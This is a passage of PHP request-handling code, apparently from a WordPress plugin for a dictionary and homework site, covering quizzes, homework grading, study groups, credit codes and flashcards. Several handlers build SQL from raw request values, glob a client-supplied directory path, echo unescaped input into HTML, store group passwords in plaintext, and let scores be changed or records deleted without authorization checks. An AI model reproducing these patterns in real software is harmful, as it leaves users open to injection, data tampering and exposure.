                $html .= '<td><input type="text" value="' . $questions['quiz'][$i - 1] . '"></td>';
                $html .= '</tr>';
            }
            $json['passage'] = $result->passages;
            break;
        case ASSIGNMENT_WRITING:
            for ($i = 1; $i <= 20; $i++) {
                $html .= '<tr>';
                $html .= '<td><textarea>' . $questions['question'][$i - 1] . '</textarea></td>';
                $html .= '<td><input type="text" value="' . $questions['quiz'][$i - 1] . '"></td>';
                $html .= '</tr>';
            }
            break;
    }
    $html .= '</tbody>';

    $json['html'] = $html;
    // $json['desc'] = $result->description;

    echo json_encode($json);
    die;
}

/*
 * return a question
 */
if ($task == 'question') {
    $current_user_id = get_current_user_id();
    if (isset($_GET['hid']) && is_numeric($_GET['hid'])) {
        $sheet = $wpdb->get_row($wpdb->prepare(
                        'SELECT s.*, hs.id AS result_id, finished_question
                FROM ' . $wpdb->prefix . 'dict_homeworks AS h
                JOIN ' . $wpdb->prefix . 'dict_sheets AS s ON s.id = h.sheet_id
                LEFT JOIN ' . $wpdb->prefix . 'dict_homework_results AS hs ON hs.homework_id = h.id
                WHERE h.id = %d AND (userid = %d OR userid IS NULL)', $_GET['hid'], $current_user_id
        ));

        if (is_null($sheet->result_id)) {
            $json['rid'] = $json['lq'] = 0;
        } else {
            $json['rid'] = $sheet->result_id;
            $json['lq'] = $sheet->finished_question;
        }
    }

    if (isset($_GET['sid']) && is_numeric($_GET['sid'])) {
        $sheet = $wpdb->get_row($wpdb->prepare(
                        'SELECT s.*, p.id AS pid, p.answers AS practice_answers
                FROM ' . $wpdb->prefix . 'dict_sheets AS s
                LEFT JOIN ' . $wpdb->prefix . 'dict_practice_results AS p ON p.sheet_id = s.id AND p.user_id = ' . $current_user_id . '
                WHERE s.id = %s', $_GET['sid']
        ));
    }

    $words = json_decode($sheet->questions);
    $practice_answers = json_decode($sheet->practice_answers, true);
    $dict_table = get_dictionary_table($sheet->dictionary_id);
    include IK_PLUGIN_DIR . '/library/formatter.php';

    if ($sheet->assignment_id == ASSIGNMENT_SPELLING) {
        $insql = '';
        $count = 0;
        foreach ($words as $key => $v) {
            $insql[] = "'" . esc_sql($v) . "'";
        }

        $results = $wpdb->get_results(
                'SELECT id, entry, sound, sound_url, definition 
                FROM ' . $wpdb->prefix . $dict_table . ' 
                WHERE entry IN (' . implode(',', $insql) . ')'
        );

        foreach ($results as $item) {
            $tmp[strtolower($item->entry)][] = array(
                'id' => $item->id,
                'entry' => $item->entry,
                'sound' => $item->sound,
                'sound_url' => $item->sound_url,
                'definition' => $item->definition
            );
        }

        foreach ($tmp as $items) {
            $a = array();

            foreach ($items as $item) {
                $a['entry'] = $item['entry'];
                $a['def'] .= WFormatter::_def($item['definition'], $sheet->dictionary_id);
                if (!isset($a['sound'])) {
                    if (!is_null($item['sound_url'])) {
                        $a['sound'] = $item['sound_url'];
                    } else {
                        $sound_url = WFormatter::_sound($item['sound'], $sheet->dictionary_id, true);
                        $a['sound'] = $sound_url;
                        if ($sound_url != '') {
                            $wpdb->update(
                                    $wpdb->prefix . $dict_table, array(
                                'sound_url' => $sound_url
                                    ), array('id' => $item['id'])
                            );
                        }
                    }
                }
                $ans = '';
                if (isset($practice_answers['q' . $count])) {
                    $ans = $practice_answers['q' . $count];
                }
                $a['selected'] = $ans;
            }
            $json['sheet'][] = $a;
            $count++;
        }
    } else {
        for ($i = 0; $i < count($words->question); $i++) {
            $ans = '';
            if (isset($practice_answers['q' . $i])) {
                $ans = $practice_answers['q' . $i];
            }

            $answers = array(
                array($words->c_answer[$i], 1),
                array($words->w_answer1[$i], 0),
                array($words->w_answer2[$i], 0)
            );
            if (!empty($words->w_answer3[$i])) {
                $answers[] = array($words->w_answer3[$i], 0);
            }
            if (!empty($words->w_answer4[$i])) {
                $answers[] = array($words->w_answer4[$i], 0);
            }

            $q[$i] = array(
                'sentence' => $words->question[$i],
                'answers' => $answers,
                'c_a' => $words->c_answer[$i],
                'quiz' => $words->quiz[$i],
                'selected' => $ans
            );
        }

        if (in_array($sheet->assignment_id, array(ASSIGNMENT_VOCAB_GRAMMAR, ASSIGNMENT_READING)) !== false) {
            $def_js = array();
            $json['sheet'] = array($q, $def_js);
        } else {
            $json['sheet'][] = $q;
        }
    }

    $json['pid'] = is_null($sheet->pid) ? 0 : (int) $sheet->pid;

    if ($sheet->assignment_id == ASSIGNMENT_READING) {
        $json['sheet']['passage'] = $sheet->passages;
    }

    $json['htype'] = '';
    if ($_GET['cmod'] == 'practice') {
        $json['htype'] = __('Selt - Study', 'iii-dictionary');
    } else {
        if ($sheet->homework_type_id == HOMEWORK_PUBLIC) {
            $json['htype'] = __('Worksheet - Free', 'iii-dictionary');
        } else if ($sheet->homework_type_id == HOMEWORK_SUBSCRIBED) {
            $json['htype'] = __('Worksheet - Subscribed', 'iii-dictionary');
        }
    }



    echo json_encode($json);
    die;
}

/*
 * saving practice answers
 */
if ($task == 'practice') {
    $userid = get_current_user_id();

    if (!$userid) {
        die;
    }

    if ($do == 'save') {
        $pid = $_REAL_POST['pid'];
        $q = $_REAL_POST['q'];
        $sid = $_REAL_POST['sid'];
        $answers = array('q' . $q => $_REAL_POST['answer']);
        $ptid = $_REAL_POST['ptid'];
        if (!$pid) {
            $result = $wpdb->insert(
                    $wpdb->prefix . 'dict_practice_results', array(
                'user_id' => $userid,
                'sheet_id' => $sid,
                'answers' => json_encode($answers),
                'practice_id' => $ptid
                    )
            );

            $pid = $wpdb->insert_id;
        } else {
            $row = $wpdb->get_row('SELECT answers, practice_id  FROM ' . $wpdb->prefix . 'dict_practice_results WHERE id = ' . esc_sql($pid));
            if ($row) {
                $updated_answers = array_merge(json_decode($row->answers, true), $answers);
                $ptid = $ptid != 0 ? $ptid : $row->practice_id;
                $result = $wpdb->update(
                        $wpdb->prefix . 'dict_practice_results', array(
                    'answers' => json_encode($updated_answers),
                    'practice_id' => $ptid
                        ), array('id' => $pid)
                );
            }
        }

        if ($result !== false) {
            echo json_encode(array($pid));
        } else {
            echo json_encode(array(0));
        }
        exit;
    }
}

/*
 * saving homework answers
 */
if ($task == 'homework') {
    $userid = get_current_user_id();

    if (!$userid || !isset($_POST['homework_id'])) {
        die;
    }

    // saving answers as student progress
    if ($do == 'answer') {
        $q = $_REAL_POST['q'];
        $hid = $_REAL_POST['hid'];
        $question_count = $_REAL_POST['qc'];
        $rid = $_REAL_POST['rid'];
        $answer = !empty($_POST['writing']) ? $_REAL_POST['answer'] : json_decode($_REAL_POST['answer'], true);
//        var_dump($answer);die;
        $graded = isset($_REAL_POST['graded']) ? $_REAL_POST['graded'] : 1;

        $score = 0;
        $score_per_question = 100 / $question_count;
        $check = MWDB::check_homework_result_is_exit($hid, $userid);
        if (!$check) {
            $ca = 0;
            if ($answer->score) {
                $score = $score_per_question;
                $ca = 1;
            }

            $result = $wpdb->insert(
                    $wpdb->prefix . 'dict_homework_results', array(
                'userid' => $userid,
                'homework_id' => $_POST['homework_id'],
                'answers' => json_encode(array('q' . $q => $answer)),
                'score' => $score,
                'correct_answers_count' => $ca,
                'attempted_on' => date('Y-m-d', time()),
                'finished_question' => $q,
                'finished' => 0,
                'graded' => $graded
                    )
            );

            if ($result) {
                echo json_encode(array($wpdb->insert_id));
            } else {
                echo json_encode(array(0));
            }
            exit;
        } else {
//            $result_sheet = $wpdb->get_row($wpdb->prepare(
//                            'SELECT answers, correct_answers_count, score 
//                    FROM ' . $wpdb->prefix . 'dict_homework_results 
//                    WHERE homework_id = %d', $hid
//            ));
////            var_dump($result_sheet->answers);die;
//            $answers = json_decode($result_sheet->answers, true);
//            $answers['q' . $q] = $answer;

            $correct_count = 0;
            // check for number of correct answers if this is not writing homework
            if (empty($_POST['writing'])) {
                foreach ($answers as $item) {
                    if ($item['score']) {
                        $correct_count++;
                    }
                }
            }
            // calculate total score
            $score = $correct_count * $score_per_question;

            $result_data = array(
                'answers' => json_encode($answers),
                'correct_answers_count' => $correct_count,
                'score' => $score,
                'finished_question' => $q,
                'attempted_on' => date('Y-m-d', time()),
                'graded' => $graded
            );
//            var_dump($result_data);die;
            $result = $wpdb->update(
                    $wpdb->prefix . 'dict_homework_results', $result_data, array('homework_id' => $hid, 'userid' => $userid)
            );

            if ($result !== false) {
                echo json_encode(array($hid));
            } else {
                echo json_encode(array(0));
            }
            exit;
        }
    }

    // set the homework to finished
    if ($do == 'submit') {
        $rid = esc_sql($_POST['rid']);
        $feedback = esc_sql(stripslashes($_POST['feedback']));

        $result = $wpdb->update(
                $wpdb->prefix . 'dict_homework_results', array(
            'finished' => 1,
            'submitted_on' => date('Y-m-d', time()),
            'message' => $feedback
                ), array('id' => $rid)
        );

        if ($result) {
            echo json_encode(array($rid));
        } else {
            echo json_encode(array(0));
        }
        exit;
    }
}

/*
 * update homework score
 */
if ($task == 'grade_homework') {
    $score = $_POST['score'];
    $hrid = $_POST['hrid'];

    if ($score >= 0 && $score <= 100) {
        $result = $wpdb->update(
                $wpdb->prefix . 'dict_homework_results', array('score' => $score, 'correct_answers_count' => $score, 'graded' => 1), array('id' => $hrid)
        );
    }
}

/**
 * get id homework result
 */
if ($task == 'getidhomework') {
    $hrid = $_POST['homework_id'];
    $homework_id = MWDB::get_id_homework_result_sheets($hrid, get_current_user_id());
    echo json_encode($homework_id);
}

/*
 * Check to see if words exist in given dictionary
 */
if ($task == 'checkword') {
    if (!isset($_GET['dict']) || !is_numeric($_GET['dict'])) {
        die;
    }

    include IK_PLUGIN_DIR . '/library/formatter.php';

    $w = stripslashes($_GET['w']);
    $dict_table = get_dictionary_table($_GET['dict']);

    $words = json_decode($w);
    $words = array_merge($words[0], $words[1]);
    $words_sound = $words;
    $output[0] = $output[1] = $insql = array();

    foreach ($words as $key => $v) {
        if ($v != '') {
            $insql[$key] = "'" . esc_sql($v) . "'";
        } else {
            unset($words[$key]);
            unset($words_sound[$key]);
        }
    }

    $results = $wpdb->get_results('SELECT id, entry, sound, sound_url FROM ' . $wpdb->prefix . $dict_table . ' WHERE entry IN (' . implode(',', $insql) . ')');

    foreach ($results as $item) {
        if (($key = array_search($item->entry, $words)) !== false) {
            unset($words[$key]);
        }

        if (is_null($item->sound_url)) {
            $sound_url = WFormatter::_sound($item->sound, $_GET['dict'], true);
            if ($sound_url != '') {
                $result = $wpdb->update(
                        $wpdb->prefix . $dict_table, array(
                    'sound_url' => $sound_url
                        ), array('id' => $item->id)
                );

                if (($key = array_search($item->entry, $words_sound)) !== false) {
                    unset($words_sound[$key]);
                }
            }
        } else {
            if (($key = array_search($item->entry, $words_sound)) !== false) {
                unset($words_sound[$key]);
            }
        }
    }

    $output[0] = $words;
    $output[1] = $words_sound;

    echo json_encode($output);
    die;
}

/*
 * toggle Sheet state
 */
if ($task == 'shtstate') {
    if (!isset($_POST['id']) || !is_numeric($_POST['id'])) {
        die;
    }

    $result = $wpdb->query($wpdb->prepare(
                    'UPDATE ' . $wpdb->prefix . 'dict_sheets SET active = ABS(active - 1) WHERE id = %d', $_POST['id']
    ));
    echo $result ? '1' : '0';
    die;
}

/*
 * Group Homework
 */
if ($task == 'group') {
    if (!isset($route[2])) {
        die;
    }

    $do = $route[2];

    if ($do == 'create') {
        $gname = esc_html($_POST['gname']);
        $gpass = esc_html($_POST['gpasswrd']);
        if (trim($gname) != '' && trim($gpass) != '') {
            if (strpos($gname, ' ') !== false) {
                echo json_encode(array('status' => 0, 'msg' => 'Group name cannot contain spacing!'));
                die;
            }
            $result = $wpdb->query($wpdb->prepare(
                            'SELECT * FROM ' . $wpdb->prefix . 'dict_groups WHERE name = %s', array($gname)
            ));

            if (!$result) {
                $res = $wpdb->insert(
                        $wpdb->prefix . 'dict_groups', array(
                    'name' => $gname,
                    'password' => $gpass,
                    'created_by' => get_current_user_id(),
                    'created_on' => date('Y-m-d', time()),
                    'active' => 1
                        )
                );

                if ($res) {
                    echo json_encode(array('status' => 1, 'msg' => 'Successfully create Group: <em>' . $gname . '</em>', 'id' => $wpdb->insert_id));
                    die;
                } else {
                    echo json_encode(array('status' => 0, 'msg' => 'Can not create Group!'));
                    die;
                }
            } else {
                echo json_encode(array('status' => 0, 'msg' => 'The name, <em>' . $gname . '</em>, is already used. Please try it again with a different name.'));
                die;
            }
        } else {
            echo json_encode(array('status' => 0, 'msg' => 'Group name and Passwords must not be empty!'));
            die;
        }
    }

    if ($do == 'list') {
        $groups = $wpdb->get_results('SELECT id, name FROM ' . $wpdb->prefix . 'dict_groups WHERE created_by = ' . get_current_user_id());
        echo json_encode($groups);
        die;
    }

    if ($do == 'changepass') {
        $apw = stripslashes($_POST['apw']);
        $npw = stripslashes($_POST['npw']);
        $gid = stripslashes($_POST['gid']);

        $user = get_userdata(get_current_user_id());
        if (wp_check_password($apw, $user->user_pass, $user->ID)) {
            $wpdb->update($wpdb->prefix . 'dict_groups', array('password' => $npw), array('id' => $gid));
            echo json_encode(array(1));
        } else {
            echo json_encode(array(0));
        }
    }

    if ($do == 'availability') {
        $gname = $_REAL_POST['gn'];
        $result = $wpdb->get_row($wpdb->prepare('SELECT id FROM ' . $wpdb->prefix . 'dict_groups WHERE name = %s', $gname));

        if (empty($result)) {
            die('1');
        } else {
            die('0');
        }
    }

    if ($do == 'students') {
        $gid = $_GET['gid'];

        $students = MWDB::get_group_students($gid);

        $output = array();
        foreach ($students as $student) {
            $output[] = array(
                'name' => $student->display_name,
                'email' => $student->user_email,
                'joined_date' => $student->joined_date,
                'done_hw' => $student->homeworks_done
            );
        }

        echo json_encode($output);
        die;
    }
}

/*
 * User availability
 */
if ($task == 'availability') {
    if ($do == 'user') {
        $user_login = $_GET['user_login'];

        $user = $wpdb->get_row($wpdb->prepare('SELECT user_login FROM ' . $wpdb->users . ' WHERE user_login = %s', $user_login));

        if ($user) {
            echo json_encode(array(0));
            die;
        }

        $user = $wpdb->get_row($wpdb->prepare('SELECT user_login FROM ' . $wpdb->users . ' WHERE user_email = %s', $user_login));

        if ($user) {
            echo json_encode(array(0));
            die;
        }

        echo json_encode(array(1));
        die;
    }
}

/*
 * User info
 */
if ($task == 'user') {
    if ($do == 'passcheck') {
        $user = get_userdata(get_current_user_id());
        if (wp_check_password($_POST['pw'], $user->user_pass, $user->ID)) {
            echo json_encode(array(1));
        } else {
            echo json_encode(array(0));
        }
        exit;
    }
}

/*
 * validate creadit code
 */
if ($task == 'validatecredit') {
    $credit_code = $_POST['c'];

    $code = $wpdb->get_row(
            $wpdb->prepare('SELECT c.*, us.activated_by, COUNT(activated_by) AS activated_times
                            FROM ' . $wpdb->prefix . 'dict_credit_codes AS c
                            LEFT JOIN ' . $wpdb->prefix . 'dict_user_subscription AS us ON us.activation_code_id = c.id
                            WHERE encoded_code = %s', $_POST['c'])
    );

    if (is_null($code)) {
        $json['status'] = 0;
        $json['title'] = __('Invalid credit code number.', 'iii-dictionary');
        $json['msg'] = __('The credit code you entered is invalid. Please enter a different one.', 'iii-dictionary');
    } else if ($code->activated_by && ($code->typeid == 1 || $code->typeid == 3 || $code->typeid == 4)) {
        $json['status'] = 0;
        $json['title'] = __('This credit code has been used already.', 'iii-dictionary');
        $json['msg'] = __('Please enter a different credit code.', 'iii-dictionary');
    } else if (!$code->active) {
        $json['status'] = 0;
        $json['title'] = __('This credit code has expired.', 'iii-dictionary');
        $json['msg'] = __('This credit code has already expired. Please enter a different one.', 'iii-dictionary');
    } else if ($code->activated_times == $code->no_of_students && $code->typeid == 2) {
        $json['status'] = 0;
        if (is_numeric($code->activated_by)) {
            $json['title'] = __('Activation error', 'iii-dictionary');
            $json['msg'] = __('Number of license is used up for this activation code. Please enter a different code.', 'iii-dictionary');
        } else {
            $json['title'] = __('Activation notice', 'iii-dictionary');
            $json['msg'] = __('This activation code is already actived from Desktop app. Please use the Desktop icon to start iklearn.com.', 'iii-dictionary');
        }
    } else {
        $json['status'] = 1;
        $json['ltype'] = (int) $code->typeid;
        $json['did'] = (int) $code->dictionary_id;
        $json['size'] = $code->no_of_students;
    }

    echo json_encode($json);
    die;
}

/*
 * flash cards
 */
if ($task == 'flashcard') {
    $dictionary_id = get_dictionary_id_by_slug($_REAL_POST['did']);

    $is_dictionary_subscribed = is_dictionary_subscribed($dictionary_id);

    if ($do == 'addfolder') {
        if (!$is_dictionary_subscribed) {
            die(json_encode(array(0)));
        }

        $name = $_REAL_POST['n'];

        $result = $wpdb->insert(
                $wpdb->prefix . 'dict_flashcard_folders', array(
            'user_id' => get_current_user_id(),
            'dictionary_id' => $dictionary_id,
            'name' => $name
                )
        );
        $current_user_id = get_current_user_id();
        $fl_fd = MWDB::get_flashcard_folders($current_user_id, true);
        echo json_encode($fl_fd);
        // if ($result) {
        //     die(json_encode(array($wpdb->insert_id)));
        // } else {
        //     die(json_encode(array(0)));
        // }
    }
    if ($do == 'addfolder1') {
        $name = $_REAL_POST['n'];

        $result = $wpdb->insert(
                $wpdb->prefix . 'dict_flashcard_folders', array(
            'user_id' => get_current_user_id(),
            'dictionary_id' => 0,
            'name' => $name
                )
        );


        if ($result) {
            die(json_encode(array($wpdb->insert_id)));
        } else {
            die(json_encode(array(0)));
        }
    }
    if ($do == 'deletefolder') {
        $name = $_REAL_POST['n'];
        $result = $wpdb->delete(
                $wpdb->prefix . 'dict_flashcard_folders', array(
            'name' => $name
                )
        );

        if ($result !== false) {
            die(json_encode(array(1)));
        } else {
            die(json_encode(array(0)));
        }
    }

    if ($do == 'addcard') {
        $current_user_id = get_current_user_id();

        if (!$is_dictionary_subscribed) {
            $cards = $wpdb->get_col('SELECT COUNT(*) FROM ' . $wpdb->prefix . 'dict_flashcards WHERE created_by = ' . $current_user_id . ' AND dictionary_id = ' . $dictionary_id);

            // free user can add up to 5 flash cards
            if ($cards[0] >= 5) {
                echo json_encode(array('status' => 2));
                die;
            }
        }

        $entry = $_REAL_POST['e'];
        $folder_id = $_REAL_POST['fid'];

        $result = $wpdb->insert(
                $wpdb->prefix . 'dict_flashcards', array(
            'created_by' => $current_user_id,
            'folder_id' => $folder_id,
            'group_id' => 0,
            'dictionary_id' => $dictionary_id,
            'word' => $entry
                )
        );

        $result2 = $wpdb->insert(
                $wpdb->prefix . 'dict_flashcard_userdata', array(
            'flashcard_id' => $wpdb->insert_id,
            'user_id' => $current_user_id
                )
        );

        if ($result) {
            echo json_encode(array('status' => 1));
        } else {
            echo json_encode(array('status' => 0));
        }

        die;
    }

    if ($do == 'savenotes') {
        $current_user_id = get_current_user_id();
        $existing = $wpdb->get_row('SELECT id FROM ' . $wpdb->prefix . 'dict_flashcard_userdata WHERE flashcard_id = ' . esc_sql($_POST['id']) . ' AND user_id = ' . $current_user_id);

        if (empty($existing)) {
            $result = $wpdb->insert(
                    $wpdb->prefix . 'dict_flashcard_userdata', array(
                'flashcard_id' => $_POST['id'],
                'user_id' => $current_user_id,
                'notes' => $_REAL_POST['notes']
                    )
            );
        } else {
            $result = $wpdb->update(
                    $wpdb->prefix . 'dict_flashcard_userdata', array(
                'notes' => $_REAL_POST['notes']
                    ), array(
                'flashcard_id' => $_POST['id'],
                'user_id' => $current_user_id
                    )
            );
        }

        if ($result !== false) {
            die(json_encode(array(1)));
        } else {
            die(json_encode(array(0)));
        }
    }

    if ($do == 'memorized') {
        $current_user_id = get_current_user_id();
        $flashcard_id = esc_sql($_POST['id']);
        $existing = $wpdb->get_row('SELECT id FROM ' . $wpdb->prefix . 'dict_flashcard_userdata WHERE flashcard_id = ' . $flashcard_id . ' AND user_id = ' . $current_user_id);

        if (isset($_POST['memorized'])) {
            $value = 1;
        } else {
            $value = 'ABS(memorized - 1)';
        }

        if (empty($existing)) {
            $wpdb->insert(
                    $wpdb->prefix . 'dict_flashcard_userdata', array(
                'flashcard_id' => $flashcard_id,
                'user_id' => $current_user_id,
                'memorized' => 1
                    )
            );
        } else {
            $wpdb->query('UPDATE ' . $wpdb->prefix . 'dict_flashcard_userdata 
                              SET memorized = ' . $value . '
                              WHERE flashcard_id = ' . $flashcard_id . ' AND user_id = ' . $current_user_id);
        }

        die;
    }

    if ($do == 'delete') {
        $current_user_id = get_current_user_id();

        $result = $wpdb->delete(
                $wpdb->prefix . 'dict_flashcards', array(
            'id' => $_POST['id'],
            'created_by' => $current_user_id
                )
        );

        $wpdb->delete(
                $wpdb->prefix . 'dict_flashcard_userdata', array(
            'flashcard_id' => $_POST['id'],
            'user_id' => $current_user_id
                )
        );

        if ($result !== false) {
            die(json_encode(array(1)));
        } else {
            die(json_encode(array(0)));
        }
    }

    if ($do == 'lookup') {
        include IK_PLUGIN_DIR . '/library/formatter.php';

        $flashcard = $wpdb->get_row($wpdb->prepare('SELECT word, dictionary_id FROM ' . $wpdb->prefix . 'dict_flashcards WHERE id = %d', $_GET['id']));

        $dictionary_table = get_dictionary_table($flashcard->dictionary_id);

        $word = $wpdb->get_row('SELECT * FROM ' . $wpdb->prefix . $dictionary_table . ' WHERE entry = \'' . $flashcard->word . '\'');

        $html = '<div id="headword">' . WFormatter::_hw($word->headword) . '</div>' .
                '<div id="pronunciation">' .
                WFormatter::_sound($word->sound, $flashcard->dictionary_id) .
                WFormatter::_pr($word->pronunciation) .
                '<span class="functional-label">' . WFormatter::_fl($word->functional_label) . '</span>' .
                '</div>' .
                '<div id="definition">' .
                WFormatter::_def($word->definition, $flashcard->dictionary_id) .
                '</div>';

        echo $html;

        die;
    }
    if ($do == 'check_exist') {
        $id_folder = $_POST['id_folder'];
        $word = $_POST['word'];
        if (MWDB::check_word_exist_folder($id_folder, $word) != null) {
            echo '1';
        } else {
            echo '0';
        }
        exit;
    }
    if ($do == 'check_exist_folder') {
        $name = $_POST['name_folder'];
        if (!empty(MWDB::check_exist_folder(strtolower($name)))) {
            echo ' 1';
        } else {
            echo ' 0';
        }
        exit;
    }
}

// grade api
if ($task === 'grade') {
    if ($do === 'add') {
        $data['parent_id'] = $_POST['parent_id'];
        $data['name'] = $_POST['name'];
        $data['type'] = $_POST['type'];
        $data['level'] = $_POST['level'];
        $data['show_panel']=$_POST['show_panel'];
        if ($last_id = MWDB::store_grade($data)) {
            echo $last_id;
        } else {
            echo '0';
        }
        exit;
    }

    if ($do == 'rename') {
        $data['id'] = $_POST['id'];
        if ($_REAL_POST['n'] != null && $_REAL_POST['n'] != '') {
            $data['name'] = $_REAL_POST['n'];
        }
        $data['show_panel'] = $_REAL_POST['check'];

        if ($last_id = MWDB::store_grade($data)) {
            echo $last_id;
        } else {
            echo '0';
        }
        exit;
    }
    if ($do == 'changelastpage') {
        $data['id'] = $_POST['id'];
        $data['lastpage'] = $_REAL_POST['check'];

        if (MWDB::store_sheet_page($data)) {
            echo 'update success';
        } else {
            echo 'update error';
        }
        exit;
    }

    if ($do == 'change_order') {
        $dir = $_POST['dir'];

        if ($dir == 'up') {
            MWDB::set_grade_order_up($_POST['id']);
        } else if ($dir == 'down') {
            MWDB::set_grade_order_down($_POST['id']);
        }
    }
}

if ($task === 'delete') {
    if ($do === 'deletehomework') {
        $data['id'] = $_POST['id'];

        $last_id = MWDB::deletehomework($data);
        echo $last_id;

        exit;
    }
}
if ($task === 'update') {
    if ($do === 'updatehomework') {
        $data['id'] = $_POST['id'];
        $data['is_retryable'] = $_POST['is_retryable'];
        $data['for_practice'] = $_POST['for_practice'];
        $data['teacherlastpage'] = $_POST['teacherlastpage'];
        $data['deadline'] = $_POST['deadline'];
        $last_id = MWDB::update_homework_assignment($data);
        echo $last_id;

        exit;
    }
}
if ($task === 'getviewdetail') {
    if (isset($_GET['id'])) {
        $code = MWDB::view_detail_subscriptions($_GET['id']);
        echo json_encode($code);
        exit;
    }
}
if ($task === 'math_worksheet') {
    if ($do === 'get') {
        //check user subscription
        update_user_subscription();
        $flag = '';
        if (isset($_GET['lid'])) {
            //if(!is_homework_tools_subscribed() || !is_mw_super_admin() || !is_mw_admin() || !(!is_user_logged_in() && isset($_GET['ncl']) && $_GET['ncl'] < 2)) {
            if (!is_math_homework_tools_subscribed() || !is_user_logged_in()) {
                $flag = 'text-muted';
            }
            if (is_mw_super_admin() || is_mw_admin()) {
                $flag = '';
            }
        }
        $query = 'SELECT ms.id, sheet_name , homework_type_id
                        FROM ' . $wpdb->prefix . 'dict_sheets AS ms
                        JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = ms.grade_id
                        JOIN (
                            SELECT id, name AS level_name, parent_id AS level_parent_id 
                            FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 1
                        ) AS lgr ON lgr.id = gr.parent_id
                        JOIN (
                            SELECT id, name AS level_category_name 
                            FROM ' . $wpdb->prefix . 'dict_grades WHERE level = 0
                        ) AS cgr ON cgr.id = lgr.level_parent_id';

        if (!empty($_GET['cid'])) {
            $cat_id = $_GET['cid'];
            $where[] = 'cgr.id = %d';
            $params[] = $cat_id;
        }

        if (!empty($_GET['plid'])) {
            $level_id = $_GET['plid'];
            $where[] = 'lgr.id = %d';
            $params[] = $level_id;
        }

        if (!empty($_GET['lid'])) {
            $sublevel_id = $_GET['lid'];
            $where[] = 'grade_id = %d';
            $params[] = $sublevel_id;
        }

        if (!empty($_GET['name'])) {
            $sheet_name = $_GET['name'];
            $where[] = 'sheet_name LIKE %s';
            $params[] = '%' . $sheet_name . '%';
        }

        if (!empty($_GET['exclude'])) {
            $where[] = 'ms.id <> %s';
            $params[] = $_GET['exclude'];
        }
        /*
          if(!is_math_homework_tools_subscribed()) {
          $where[] = 'homework_type_id <> ' . HOMEWORK_SUBSCRIBED;
          }
         */

        if (!empty($where)) {
            $query .= ' WHERE ' . implode(' AND ', $where);
        }

        $query .= ' ORDER BY ms.ordering';

        $worksheets = $wpdb->get_results(
                $wpdb->prepare($query, $params)
        );
        $is_sub = get_ws_subscribed();
        $json = array();
        foreach ($worksheets as $worksheet) {
            $json[] = array('sid' => $worksheet->id, 'name' => $worksheet->sheet_name, 'sub' => $flag, 'type' => $worksheet->homework_type_id, 'is' => $is_sub);
        }
//        echo $query;die;
        echo json_encode($json);
        exit;
    }
}

if ($task === 'worksheet') {
    if ($do === 'get') {
        $query = 'SELECT [columns]
                      FROM ' . $wpdb->prefix . 'dict_sheets AS s
                      JOIN ' . $wpdb->prefix . 'dict_grades AS gr ON gr.id = s.grade_id';

        $columns[] = 's.*, gr.name AS grade';

        $where[] = $_GET['is_math'] ? 'category_id = 5' : 'category_id <> 5';

        if ($_GET['assignment_name']) {
            $columns[] = 'hal.name as aname';
            $query .= ' JOIN ' . $wpdb->prefix . 'dict_homework_assignment_langs AS hal ON hal.assignment_id = s.assignment_id AND hal.lang = \'' . get_short_lang_code() . '\'';
        }

        if (!empty($_GET['name'])) {
            $sheet_name = $_GET['name'];
            $where[] = 'sheet_name LIKE %s';
            $params[] = '%' . $sheet_name . '%';
        }

        if (!empty($_GET['assignment'])) {
            $where[] = 'assignment_id = %d';
            $params[] = $_GET['assignment'];
        }

        if (!empty($_GET['type'])) {
            $where[] = 'homework_type_id = %d';
            $params[] = $_GET['type'];
        }

        if (!empty($_GET['grade'])) {
            $where[] = 'gr.name = %d';
            $params[] = $_GET['grade'];
        }

        if (!empty($_GET['exclude'])) {
            $where[] = 's.id <> %s';
            $params[] = $_GET['exclude'];
        }

        if (!empty($where)) {
            $query .= ' WHERE ' . implode(' AND ', $where);
        }

        $query = str_replace('[columns]', implode(',', $columns), $query);

        $worksheets = $wpdb->get_results(
                $wpdb->prepare($query, $params)
        );

        $json = array();
        foreach ($worksheets as $worksheet) {
            $item = array('sid' => $worksheet->id, 'name' => $worksheet->sheet_name);
            if ($_GET['assignment_name']) {
                $item['aname'] = $worksheet->aname;
            }
            if ($_GET['grade_name']) {
                $item['grade'] = $worksheet->grade;
            }
            $json[] = $item;
        }

        echo json_encode($json);
        exit;
    }
}

if ($task == 'mw_download') {
    $is_login = $_GET['is_login'];
    if ($is_login == 0) {
        $json['status'] = 0;
    } else {
        $json['status'] = 1;
    }
    echo json_encode($json);
    exit;
}

if ($task == 'status_msg') {
    global $wpdb;
    $id = $_POST['id'];
    if ($id != 0) {
        $result = $wpdb->query(
                'UPDATE ' . $wpdb->prefix . 'dict_private_message_inbox 
                SET status = 1 WHERE id = ' . $id
        );
    }
    exit;
}

if ($task == 'get_sub_dic') {
    $sub_folder = $_POST['sub'];
    $html = '<option value="" >' . __('Select a directory', 'iii-dictionary') . '</option>';
    if (!empty($sub_folder)) {
        foreach (glob($sub_folder . '/*', GLOB_ONLYDIR) as $data) {
            $selected = ($_SESSION['media']['sub-dic'] == basename($data)) ? 'selected' : '';
            $html .= '<option value="' . basename($data) . '"' . $selected . '>' . basename($data) . '</option>';
        }
    }

    echo $html;
    exit;
}

if ($task == 'chat') {
    if ($do === 'request') {
        global $wpdb;
        $_sheet_id = (filter_var($_POST['sid'], FILTER_VALIDATE_INT)) ? $_POST['sid'] : 0;
        $_user_id = (filter_var($_POST['id'], FILTER_VALIDATE_INT)) ? $_POST['id'] : 0;

        $_points = ik_get_user_points($_user_id);
        $_price_chat = mw_get_option('math-chat-price');
        $_return = (isset($_POST['return'])) ? trim($_POST['return']) : '';

        if ($_points < $_price_chat) {
            $html = '<div class="col-md-12 block-respone-content"><p style="padding: 15px;">' . __('Sorry, you do not have enough points for this session </br> Would you like to purchase points now?', 'iii-dictionary') . '</p></div>';
            $html .= '<div class="col-md-12 block-popup-btn" style="position: absolute;bottom: 0;height: 50px;padding-bottom: 0px !important;"><div class="row" style="height:100%">';
            $html .= '<div class="col-md-6" style="height:100%;padding-right:0px !important;border: 1.5px solid #2e6da4;border-right:none;"><button style="width:100%;height:100%" name="btn-purchase-points" type="submit" form="main-form" class="btn-popup-style">' . __('Yes', 'iii-dictionary') . '</button></div>';
